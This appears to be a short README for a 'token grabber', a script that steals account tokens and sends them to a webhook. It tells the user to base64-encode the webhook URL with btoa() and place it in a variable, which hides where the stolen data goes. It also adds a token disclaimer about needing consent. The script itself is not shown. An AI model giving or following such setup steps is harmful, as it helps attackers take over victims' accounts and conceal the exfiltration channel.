encrypted script for token grabber
you need to encrypt the url of your webhook by doing btoa("WEBHOOK URL");
and put the encrypted result in the variable url (var url="ENCRYPTED WEBHOOK URL";)
#that's all if you have any problem you can call me, i'm not responsable if your doing bad thing with it.
#Remember you need consent of the other peolpe to paste the script ;)
bye
